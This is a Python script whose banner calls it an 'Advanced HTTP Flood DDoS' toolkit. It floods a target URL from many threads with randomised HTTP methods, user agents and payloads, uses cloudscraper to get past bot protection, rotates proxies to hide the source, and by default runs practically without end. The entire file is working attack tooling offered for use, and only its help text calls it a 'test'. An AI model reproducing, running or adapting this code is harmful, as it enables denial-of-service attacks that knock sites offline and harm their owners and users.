!/usr/bin/env python3

import requests
import time
import argparse
import threading
import logging
import random
import json
from colorama import init, Fore, Style
from dns import resolver
from base64 import b64encode
from itertools import cycle
from cloudscraper import create_scraper
import os
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
from uuid import uuid4
import signal
import sys

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)  # Track RPS for the last 60 seconds

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

# Functions
def display_banner():
    print(f"""{BLUE}
    ##################################################
    #                                                #
    #                DDoS Toolkit                    #
    #          Advanced HTTP Flood DDoS              #
    #                                                #
    #              Coded By MIDO777                  #
    #                                                #
    ##################################################
    {RESET}""")

def load_proxies(proxy_file: str):
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        logging.info(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        logging.error(f"Proxy file '{proxy_file}' not found.")
        return []

def validate_proxies(proxies):
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    logging.info(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

def check_proxy(proxy: str):
    try:
        response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
        return response.status_code == 200
    except requests.RequestException:
        return False

def resolve_target(target_url: str):
    try:
        domain = target_url.split("//")[-1].split("/")[0]
        ip = resolver.resolve(domain, "A")[0].to_text()
        logging.info(f"Resolved {domain} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def check_target_reachable(ip: str):
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
        return result.returncode == 0
    except Exception as e:
        logging.error(f"Ping check failed: {e}")
        return False

def generate_payload(payload_type: str):
    payload_id = str(uuid4())
    if payload_type == "json":
        return json.dumps({"id": payload_id, "data": b64encode(os.urandom(64)).decode()})
    elif payload_type == "xml":
        return f"<data><id>{payload_id}</id><value>{b64encode(os.urandom(64)).decode()}</value></data>"
    elif payload_type == "form":
        return {"id": payload_id, "data": b64encode(os.urandom(64)).decode()}
    else:
        return None

def attack(target_url: str, stop_event: threading.Event, pause_time: float, proxies=None, headers=None, payload_type="json"):
    global requests_sent, successful_requests, failed_requests, last_time
    scraper = create_scraper()
    proxy_pool = cycle(proxies) if proxies else None

    while not stop_event.is_set():
        try:
            headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
            method = random.choice(HTTP_METHODS)
            payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

            proxy = {"http": next(proxy_pool), "https": next(proxy_pool)} if proxy_pool else None

            response = scraper.request(
                method, target_url, headers=headers, proxies=proxy, timeout=5, data=payload
            )

            with requests_lock:
                requests_sent += 1
                last_time = time.time()
                if response.status_code in [200, 201, 204]:
                    successful_requests += 1
                else:
                    failed_requests += 1

        except requests.RequestException as e:
            with requests_lock:
                failed_requests += 1
            logging.error(f"Request failed: {e}")

        time.sleep(pause_time)

def display_status(stop_event: threading.Event, duration: int, results_file=None):
    start_time = time.time()
    results = []
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        with requests_lock:
            current_time = time.time()
            rps = requests_sent / max(1, current_time - start_time)
            rps_history.append(rps)
            stats = {
                "Time": elapsed,
                "Requests Sent": requests_sent,
                "Successful Requests": successful_requests,
                "Failed Requests": failed_requests,
                "RPS": rps,
            }
            results.append(stats)
            print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
        time.sleep(1)

def calculate_rps_stats():
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

def signal_handler(sig, frame):
    print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    sys.exit(0)

def parse_args():
    parser = argparse.ArgumentParser(description="DDoS Toolkit coded by MIDO")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
    parser.add_argument("-d", "--duration", type=int, default=999999999999999999999, help="Test duration (seconds)")
    parser.add_argument("--proxies", help="File containing proxy list")
    parser.add_argument("--headers", help="Custom headers as JSON string")
    parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
    parser.add_argument("--results", help="File to save results (CSV)")
    parser.add_argument("-l", "--logfile", default="test.log", help="Log file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def setup_logging(logfile: str, verbose: bool):
    logging.basicConfig(
        filename=logfile,
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
    )

def main():
    args = parse_args()

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    setup_logging(args.logfile, args.verbose)
    display_banner()

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = validate_proxies(proxies)

    headers = json.loads(args.headers) if args.headers else None

    target_ip = args.url.split("//")[-1].split("/")[0]

    if not check_target_reachable(target_ip):
        print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(1)

    stop_event = threading.Event()
    threads = []

    for _ in range(args.threads):
        t = threading.Thread(
            target=attack,
            args=(args.url, stop_event, args.pause, proxies, headers, args.payload),
        )
        t.daemon = True
        threads.append(t)
        t.start()

    display_thread = threading.Thread(
        target=display_status, args=(stop_event, args.duration, args.results)
    )
    display_thread.daemon = True
    display_thread.start()

    signal.signal(signal.SIGINT, signal_handler)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"{RED}Interrupted by user.{RESET}")
    finally:
        stop_event.set()

    for t in threads:
        t.join()

    with requests_lock:
        rps_stats = calculate_rps_stats()
        print(f"{GREEN}Test completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps_stats['avg']:.2f}{RESET}")
        logging.info(f"Test finished. Total Requests Sent: {requests_sent}, Successful: {successful_requests}, Failed: {failed_requests}, Final RPS: {rps_stats['avg']:.2f}")

if __name__ == "__main__":
    main()
